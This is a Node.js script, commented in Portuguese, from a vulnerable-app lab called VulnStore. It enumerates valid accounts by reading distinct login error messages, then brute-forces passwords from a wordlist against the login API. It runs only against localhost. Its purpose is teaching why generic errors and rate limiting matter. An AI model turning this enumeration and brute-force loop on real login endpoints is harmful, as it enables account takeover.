/**
 * Demo de enumeração de usuários + força bruta no login (sem rate limit).
 * Uso:  node scripts/brute-login.js [baseUrl]
 * Somente para o laboratório local da VulnStore.
 */
const base = process.argv[2] || 'http://127.0.0.1:3000';
if (!/^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?$/.test(base)) {
  console.error('Este script só roda contra o laboratório local.'); process.exit(1);
}
const fs = require('fs');
const path = require('path');
const emails = ['maria@vulnstore.test', 'bruno@vulnstore.test', 'carlos@vulnstore.test'];
const words = fs.readFileSync(path.join(__dirname, 'wordlist.txt'), 'utf8').split(/\r?\n/).filter(Boolean);

const login = (email, password) => fetch(base + '/api/auth/login', {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }),
}).then(async (r) => ({ status: r.status, body: await r.json() }));

(async () => {
  console.log('[*] Fase 1 — enumeração de usuários');
  const valid = [];
  for (const e of emails) {
    const r = await login(e, 'x');
    console.log(`    ${e.padEnd(24)} -> ${r.status} ${r.body.error || ''}`);
    if (r.status === 401 && r.body.error === 'Senha incorreta') valid.push(e);
  }
  if (!valid.length) { console.log('[-] Mensagens genéricas: não dá para saber quais e-mails existem.'); }

  const targets = valid.length ? valid : ['bruno@vulnstore.test'];
  console.log(`\n[*] Fase 2 — força bruta (${words.length} senhas) em: ${targets.join(', ')}`);
  for (const e of targets) {
    for (let i = 0; i < words.length; i++) {
      const r = await login(e, words[i]);
      if (r.status === 429) { console.log(`[!] HTTP 429 na tentativa ${i + 1}. Bloqueado pelo rate limit.`); break; }
      if (r.status === 200) { console.log(`[+] ${e} : ${words[i]}  (tentativa ${i + 1})`); break; }
    }
  }
})();
